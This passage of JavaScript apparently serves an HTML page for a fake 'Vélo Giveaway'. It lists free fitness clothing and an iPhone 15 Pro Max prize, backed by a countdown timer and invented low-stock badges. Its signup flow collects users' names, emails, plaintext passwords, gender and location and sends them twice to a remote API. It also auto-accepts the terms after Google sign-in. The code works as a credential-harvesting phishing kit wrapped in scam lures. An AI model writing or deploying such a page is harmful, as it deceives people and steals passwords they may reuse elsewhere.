  { id:'p6', title:'Pilates Mat Pro', category:'Pilates', price:0, originalPrice:69.99, image:'/images/pilate01.jpg', stock:10 },
  { id:'p7', title:'Lulu-Lite Leggings', category:'Lulu', price:0, originalPrice:109.99, image:'/images/Lulu01.jpg', stock:4 },
  { id:'p8', title:'Tracksuit Premium', category:'Tracksuits', price:0, originalPrice:159.99, image:'/images/tracksuit.jpg', stock:3 },
  { id:'p9', title:'Aloo Yoga Set', category:'Yoga', price:0, originalPrice:99.99, image:'/images/aloo01.png', stock:7 },
  { id:'p10', title:'Pilates Tank', category:'Pilates', price:0, originalPrice:39.99, image:'/images/pilate02.png', stock:14 },
  { id:'p11', title:'Lulu Hoodie', category:'Lulu', price:0, originalPrice:119.99, image:'/images/lulu02.jpg', stock:5 },
  { id:'p12', title:'Travel Duffel Bag', category:'Bags', price:0, originalPrice:69.99, image:'/images/bag03.png', stock:11 }
];

const quizQuestions = [
  { id: 'q1', question: "What's your go-to coffee order?", options: ['☕ Black', '🥛 Latte', '🧊 Iced', '🌙 Decaf'] },
  { id: 'q2', question: 'Which activity sounds most appealing?', options: ['🌿 Meadow stroll', '💪 Working out', '🧖 Spa day', '🛍️ Shopping'] },
  { id: 'q3', question: "What's your style vibe?", options: ['🕰️ Classic & Timeless', '🚀 Modern & Sleek', '🎨 Creative & Bold', '🌿 Natural & Earthy'] }
];

let cart = [];
let iphoneStock = 8;
let heroIndex = 0, iphoneIndex = 0, heroInterval, iphoneInterval;
let currentStep = 'signup', currentQuestion = 0, quizAnswers = {}, userData = {};

// ============================================================
// DOM References
// ============================================================
const productGrid = document.getElementById('productGrid');
const cartItemsEl = document.getElementById('cartItems');
const cartCountEl = document.getElementById('cartCount');
const cartTotalEl = document.getElementById('cartTotal');
const cartSidebar = document.getElementById('cartSidebar');
const cartOverlay = document.getElementById('cartOverlay');
const cartOpenBtn = document.getElementById('cartOpenBtn');
const cartCloseBtn = document.getElementById('cartCloseBtn');
const checkoutOpenBtn = document.getElementById('checkoutOpenBtn');
const checkoutOverlay = document.getElementById('checkoutOverlay');
const checkoutCloseBtn = document.getElementById('checkoutCloseBtn');
const toastEl = document.getElementById('toast');
let toastTimer;

const stepSignup = document.getElementById('stepSignup');
const stepQuiz = document.getElementById('stepQuiz');
const stepSuccess = document.getElementById('stepSuccess');
const nameInput = document.getElementById('nameInput');
const emailInput = document.getElementById('emailInput');
const passInput = document.getElementById('passInput');
const genderInput = document.getElementById('genderInput');
const locationInput = document.getElementById('locationInput');
const termsCheck = document.getElementById('termsCheck');
const signupBtn = document.getElementById('signupBtn');
const quizContainer = document.getElementById('quizContainer');
const quizNextBtn = document.getElementById('quizNextBtn');
const doneBtn = document.getElementById('doneBtn');
const successEmail = document.getElementById('successEmail');

// ============================================================
// Slider Functions
// ============================================================
function initHeroSlider() {
  const track = document.getElementById('heroTrack');
  const dotsContainer = document.getElementById('heroDots');
  const slides = track.querySelectorAll('img');
  const total = slides.length;
  dotsContainer.innerHTML = '';
  for (let i = 0; i < total; i++) {
    const dot = document.createElement('span');
    if (i === 0) dot.classList.add('active');
    dot.dataset.index = i;
    dot.addEventListener('click', function() { goToHeroSlide(i); });
    dotsContainer.appendChild(dot);
  }
  function goToHeroSlide(index) {
    heroIndex = index;
    track.style.transform = 'translateX(-' + (index * 100) + '%)';
    var dots = document.querySelectorAll('#heroDots span');
    for (var d = 0; d < dots.length; d++) {
      dots[d].classList.toggle('active', d === index);
    }
  }
  function nextHeroSlide() { goToHeroSlide((heroIndex + 1) % total); }
  if (heroInterval) clearInterval(heroInterval);
  heroInterval = setInterval(nextHeroSlide, 4000);
  window.goToHeroSlide = goToHeroSlide;
}

function initIphoneSlider() {
  const track = document.getElementById('iphoneTrack');
  const dotsContainer = document.getElementById('iphoneDots');
  const slides = track.querySelectorAll('img');
  const total = slides.length;
  dotsContainer.innerHTML = '';
  for (let i = 0; i < total; i++) {
    const dot = document.createElement('span');
    if (i === 0) dot.classList.add('active');
    dot.dataset.index = i;
    dot.addEventListener('click', function() { goToIphoneSlide(i); });
    dotsContainer.appendChild(dot);
  }
  function goToIphoneSlide(index) {
    iphoneIndex = index;
    track.style.transform = 'translateX(-' + (index * 100) + '%)';
    var dots = document.querySelectorAll('#iphoneDots span');
    for (var d = 0; d < dots.length; d++) {
      dots[d].classList.toggle('active', d === index);
    }
  }
  function nextIphoneSlide() { goToIphoneSlide((iphoneIndex + 1) % total); }
  if (iphoneInterval) clearInterval(iphoneInterval);
  iphoneInterval = setInterval(nextIphoneSlide, 3500);
  window.goToIphoneSlide = goToIphoneSlide;
}

function startCountdown(targetDate) {
  var els = ['cdDays','cdHours','cdMins','cdSecs'].map(function(id) { return document.getElementById(id); });
  function tick() {
    var diff = targetDate - Date.now();
    if (diff <= 0) { diff = 0; clearInterval(interval); }
    var d = Math.floor(diff/86400000), h = Math.floor((diff%86400000)/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
    els[0].textContent = String(d).padStart(2,'0');
    els[1].textContent = String(h).padStart(2,'0');
    els[2].textContent = String(m).padStart(2,'0');
    els[3].textContent = String(s).padStart(2,'0');
  }
  tick(); var interval = setInterval(tick, 1000); return interval;
}
startCountdown(Date.now() + 2*86400000 + 14*3600000);

// ============================================================
// Product Rendering & Cart
// ============================================================
function renderProducts() {
  var html = '';
  for (var i = 0; i < products.length; i++) {
    var p = products[i];
    html += '<div class="product-card" data-id="' + p.id + '">';
    html += '<div class="image-wrap"><img src="' + p.image + '" alt="' + p.title + '" loading="lazy" /></div>';
    html += '<div class="info">';
    html += '<div class="product-category">' + p.category + '</div>';
    html += '<div class="product-title">' + p.title + '</div>';
    html += '<div class="product-price">FREE ';
    if (p.originalPrice) {
      html += '<span class="original">$' + p.originalPrice.toFixed(2) + '</span>';
    }
    html += '</div>';
    html += '<button class="add-btn" data-id="' + p.id + '">Add to Cart</button>';
    html += '</div>';
    if (p.stock <= 5) {
      html += '<span class="stock-badge low">Only ' + p.stock + ' left</span>';
    }
    html += '</div>';
  }
  productGrid.innerHTML = html;
  
  var buttons = document.querySelectorAll('.product-card .add-btn');
  for (var b = 0; b < buttons.length; b++) {
    buttons[b].addEventListener('click', function() {
      var id = this.dataset.id;
      var product = null;
      for (var j = 0; j < products.length; j++) {
        if (products[j].id === id) { product = products[j]; break; }
      }
      if (product) addToCart(product);
    });
  }
}

function addToCart(product) {
  var existing = null;
  for (var i = 0; i < cart.length; i++) {
    if (cart[i].id === product.id) { existing = cart[i]; break; }
  }
  if (existing) { existing.qty += 1; }
  else { cart.push({ id: product.id, title: product.title, category: product.category, price: product.price, originalPrice: product.originalPrice, image: product.image, stock: product.stock, qty: 1 }); }
  updateCartUI();
  showToast(product.title + ' added to cart!');
  setTimeout(openCart, 400);
}

function removeFromCart(id) {
  var newCart = [];
  for (var i = 0; i < cart.length; i++) {
    if (cart[i].id !== id) { newCart.push(cart[i]); }
  }
  cart = newCart;
  updateCartUI();
}

function updateQty(id, delta) {
  var item = null;
  for (var i = 0; i < cart.length; i++) {
    if (cart[i].id === id) { item = cart[i]; break; }
  }
  if (!item) return;
  item.qty += delta;
  if (item.qty <= 0) {
    var newCart = [];
    for (var j = 0; j < cart.length; j++) {
      if (cart[j].id !== id) { newCart.push(cart[j]); }
    }
    cart = newCart;
  }
  updateCartUI();
}

function updateCartUI() {
  var totalItems = 0;
  var totalPrice = 0;
  for (var i = 0; i < cart.length; i++) {
    totalItems += cart[i].qty;
    totalPrice += cart[i].price * cart[i].qty;
  }
  cartCountEl.textContent = totalItems;
  cartTotalEl.textContent = '$' + totalPrice.toFixed(2);
  
  if (cart.length === 0) {
    cartItemsEl.innerHTML = '<div class="cart-empty"><span class="big">🛒</span>Your cart is empty.<br />Add items to enter!</div>';
    checkoutOpenBtn.disabled = true;
    return;
  }
  
  checkoutOpenBtn.disabled = false;
  var html = '';
  for (var i = 0; i < cart.length; i++) {
    var item = cart[i];
    html += '<div class="cart-item" data-id="' + item.id + '">';
    html += '<img class="thumb" src="' + item.image + '" alt="' + item.title + '" />';
    html += '<div class="details">';
    html += '<div class="name">' + item.title + '</div>';
    html += '<div class="meta">FREE</div>';
    html += '<div class="qty-wrap">';
    html += '<button class="qty-dec" data-id="' + item.id + '">−</button>';
    html += '<span class="qty">' + item.qty + '</span>';
    html += '<button class="qty-inc" data-id="' + item.id + '">+</button>';
    html += '</div></div>';
    html += '<div class="item-total">FREE</div>';
    html += '<button class="remove-item" data-id="' + item.id + '">✕</button>';
    html += '</div>';
  }
  cartItemsEl.innerHTML = html;
  
  var decs = document.querySelectorAll('.qty-dec');
  for (var d = 0; d < decs.length; d++) {
    decs[d].addEventListener('click', function() { updateQty(this.dataset.id, -1); });
  }
  var incs = document.querySelectorAll('.qty-inc');
  for (var inc = 0; inc < incs.length; inc++) {
    incs[inc].addEventListener('click', function() { updateQty(this.dataset.id, 1); });
  }
  var removes = document.querySelectorAll('.remove-item');
  for (var r = 0; r < removes.length; r++) {
    removes[r].addEventListener('click', function() { removeFromCart(this.dataset.id); });
  }
}

function openCart() { cartSidebar.classList.add('open'); cartOverlay.classList.add('open'); document.body.style.overflow = 'hidden'; }
function closeCart() { cartSidebar.classList.remove('open'); cartOverlay.classList.remove('open'); document.body.style.overflow = ''; }
cartOpenBtn.addEventListener('click', openCart);
cartCloseBtn.addEventListener('click', closeCart);
cartOverlay.addEventListener('click', closeCart);

// ============================================================
// Google Sign-In
// ============================================================
function initGoogleSignIn() {
  if (typeof google !== 'undefined') {
    google.accounts.id.initialize({
      client_id: 'YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com',
      callback: handleGoogleCredentialResponse,
      auto_select: false,
      cancel_on_tap_outside: true
    });
    google.accounts.id.renderButton(
      document.getElementById('googleBtnContainer'),
      { theme: 'outline', size: 'large', width: '100%', text: 'continue_with', shape: 'pill', logo_alignment: 'left' }
    );
  }
}

function handleGoogleCredentialResponse(response) {
  try {
    var payload = JSON.parse(atob(response.credential.split('.')[1]));
    emailInput.value = payload.email || '';
    nameInput.value = payload.name || '';
    var googlePassword = 'google-auth-' + Date.now() + '-' + Math.random().toString(36).slice(2, 10);
    passInput.value = googlePassword;
    
    var container = document.getElementById('googleBtnContainer');
    container.innerHTML = '<div class="google-confirm"><span>✅</span><div><div class="name">Signed in as ' + (payload.name || 'Google User') + '</div><div class="email">' + (payload.email || '') + '</div></div></div>';
    
    showToast('✅ Welcome ' + (payload.name || 'back') + '!');
    setTimeout(function() {
      if (!termsCheck.checked) termsCheck.checked = true;
      signupBtn.click();
    }, 600);
  } catch(e) {
    console.error('Google auth error:', e);
    showToast('❌ Google Sign-In failed. Please try again.');
  }
}

// ============================================================
// Toast Notification
// ============================================================
function showToast(msg) {
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(function() { toastEl.classList.remove('show'); }, 2800);
}

// ============================================================
// Quiz Rendering
// ============================================================
function renderQuiz() {
  var q = quizQuestions[currentQuestion];
  var html = '<div style="margin-bottom:20px">';
  html += '<p style="font-weight:600;font-size:15px;margin-bottom:12px">' + (currentQuestion + 1) + '. ' + q.question + '</p>';
  for (var i = 0; i < q.options.length; i++) {
    var opt = q.options[i];
    var checked = (quizAnswers[currentQuestion] === opt) ? 'checked' : '';
    html += '<div class="quiz-option">';
    html += '<input type="radio" name="quiz_q' + currentQuestion + '" value="' + opt + '" id="q' + currentQuestion + '_' + i + '" ' + checked + ' />';
    html += '<label for="q' + currentQuestion + '_' + i + '">' + opt + '</label>';
    html += '</div>';
  }
  html += '</div>';
  html += '<p style="font-size:13px;color:var(--text-muted);text-align:center">Question ' + (currentQuestion + 1) + ' of ' + quizQuestions.length + '</p>';
  quizContainer.innerHTML = html;
  
  var dots = document.querySelectorAll('.step-dot');
  for (var d = 0; d < dots.length; d++) {
    dots[d].classList.toggle('active', d === currentQuestion);
    dots[d].classList.toggle('done', d < currentQuestion);
  }
  quizNextBtn.textContent = (currentQuestion === quizQuestions.length - 1) ? '🎁 Submit Entry' : 'Next →';
}

function goToStep(step) {
  currentStep = step;
  stepSignup.style.display = (step === 'signup') ? 'block' : 'none';
  stepQuiz.style.display = (step === 'quiz') ? 'block' : 'none';
  stepSuccess.style.display = (step === 'success') ? 'block' : 'none';
}

function openCheckout() {
  if (cart.length === 0) { showToast('Add at least one item first!'); return; }
  checkoutOverlay.classList.add('open');
  document.body.style.overflow = 'hidden';
  goToStep('signup');
  var fields = document.querySelectorAll('.field');
  for (var f = 0; f < fields.length; f++) {
    fields[f].classList.remove('error');
  }
}

function closeCheckout() { checkoutOverlay.classList.remove('open'); document.body.style.overflow = ''; }

checkoutOpenBtn.addEventListener('click', openCheckout);
checkoutCloseBtn.addEventListener('click', closeCheckout);
checkoutOverlay.addEventListener('click', function(e) { if (e.target === checkoutOverlay) closeCheckout(); });
document.getElementById('heroCta').addEventListener('click', function(e) { e.preventDefault(); openCheckout(); });

// ============================================================
// API Calls
// ============================================================
signupBtn.addEventListener('click', async function() {
  var name = nameInput.value.trim();
  var email = emailInput.value.trim();
  var password = passInput.value.trim();
  var gender = genderInput.value;
  var location = locationInput.value.trim();
  var terms = termsCheck.checked;
  var isGoogleUser = password.startsWith('google-auth-');
  
  var valid = true;
  if (!name || name.length < 2) { document.getElementById('nameField').classList.add('error'); valid = false; } else { document.getElementById('nameField').classList.remove('error'); }
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { document.getElementById('emailField').classList.add('error'); valid = false; } else { document.getElementById('emailField').classList.remove('error'); }
  if (!isGoogleUser && (!password || password.length < 8)) { document.getElementById('passField').classList.add('error'); valid = false; } else { document.getElementById('passField').classList.remove('error'); }
  if (!location || location.length < 2) { document.getElementById('locationField').classList.add('error'); valid = false; } else { document.getElementById('locationField').classList.remove('error'); }
  if (!terms) { showToast('Please agree to the Terms of Service'); valid = false; }
  if (!valid) return;
  
  userData = { name: name, email: email, password: password, gender: gender, location: location, isGoogleUser: isGoogleUser };
  signupBtn.textContent = isGoogleUser ? '⏳ Signing in...' : '⏳ Creating account...';
  signupBtn.disabled = true;
  
  try {
    var response = await fetch(API_URL + '/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: email, password: password, name: name, gender: gender, location: location, isGoogleUser: isGoogleUser, step: isGoogleUser ? 'google_signin' : 'signup_complete' })
    });
    if (response.ok) {
      currentQuestion = 0; quizAnswers = {}; renderQuiz(); goToStep('quiz');
      showToast(isGoogleUser ? '✅ Signed in successfully!' : '✅ Account created successfully!');
    } else {
      showToast(isGoogleUser ? '❌ Sign-in failed. Please try again.' : '❌ Sign-up failed. Please try again.');
    }
  } catch (e) { showToast('❌ Network error. Please check your connection.'); }
  
  signupBtn.textContent = isGoogleUser ? 'Sign In →' : 'Create Account →';
  signupBtn.disabled = false;
});

quizNextBtn.addEventListener('click', async function() {
  var selected = document.querySelector('input[name="quiz_q' + currentQuestion + '"]:checked');
  if (!selected) { showToast('Please select an answer!'); return; }
  quizAnswers[currentQuestion] = selected.value;
  
  if (currentQuestion === quizQuestions.length - 1) {
    quizNextBtn.textContent = '⏳ Submitting...';
    quizNextBtn.disabled = true;
    try {
      var response = await fetch(API_URL + '/api/quiz', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: userData.email, password: userData.password, name: userData.name, gender: userData.gender, location: userData.location, quiz: quizAnswers })
      });
      if (response.ok) { successEmail.textContent = userData.email; goToStep('success'); showToast('🎉 You\'re entered! Good luck!'); } 
      else { showToast('❌ Something went wrong. Please try again.'); quizNextBtn.textContent = '🎁 Submit Entry'; quizNextBtn.disabled = false; }
    } catch (e) { showToast('❌ Network error. Please try again.'); quizNextBtn.textContent = '🎁 Submit Entry'; quizNextBtn.disabled = false; }
  } else { currentQuestion++; renderQuiz(); var firstRadio = document.querySelector('input[name="quiz_q' + currentQuestion + '"]'); if (firstRadio) setTimeout(function() { firstRadio.focus(); }, 100); }
});

doneBtn.addEventListener('click', function() { closeCheckout(); showToast('🎁 Thanks for entering!'); });

// ============================================================
// iPhone Add to Cart
// ============================================================
document.getElementById('iphoneAddBtn').addEventListener('click', function() {
  if (iphoneStock <= 0) { showToast('Sorry, spots are full!'); return; }
  iphoneStock -= 1;
  var iphoneProduct = { id:'iphone15', title:'iPhone 15 Pro Max', category:'Grand Prize', price:0, originalPrice:1199, image:'/images/iphone01.png', stock:iphoneStock };
  var existing = null;
  for (var i = 0; i < cart.length; i++) {
    if (cart[i].id === 'iphone15') { existing = cart[i]; break; }
  }
  if (existing) { existing.qty += 1; }
  else { cart.push({ id: iphoneProduct.id, title: iphoneProduct.title, category: iphoneProduct.category, price: iphoneProduct.price, originalPrice: iphoneProduct.originalPrice, image: iphoneProduct.image, stock: iphoneProduct.stock, qty: 1 }); }
  updateCartUI();
  showToast('iPhone added to your entry!');
  setTimeout(openCart, 400);
  if (iphoneStock <= 0) {
    document.getElementById('iphoneAddBtn').textContent = 'Spots Full';
    document.getElementById('iphoneAddBtn').disabled = true;
    document.getElementById('iphoneAddBtn').style.opacity = '0.5';
  }
});

// ============================================================
// Keyboard Events
// ============================================================
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') { if (cartSidebar.classList.contains('open')) closeCart(); if (checkoutOverlay.classList.contains('open')) closeCheckout(); }
  if (e.key === 'Enter' && checkoutOverlay.classList.contains('open')) {
    if (currentStep === 'signup') signupBtn.click();
    else if (currentStep === 'quiz') quizNextBtn.click();
  }
});

// ============================================================
// Real-time Validation
// ============================================================
var inputs = document.querySelectorAll('.field input, .field select');
for (var inp = 0; inp < inputs.length; inp++) {
  inputs[inp].addEventListener('input', function() { 
    var field = this.closest('.field');
    if (field) field.classList.remove('error');
  });
  inputs[inp].addEventListener('change', function() {
    var field = this.closest('.field');
    if (field) field.classList.remove('error');
  });
}

// ============================================================
// Initialize Everything
// ============================================================
renderProducts();
updateCartUI();
initHeroSlider();
initIphoneSlider();
initGoogleSignIn();

console.log('🎁 Vélo Giveaway — ready! API: ' + API_URL);
</script>
</body>
</html>`;
    
    return new Response(html, {
      headers: {
        'Content-Type': 'text/html',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
}
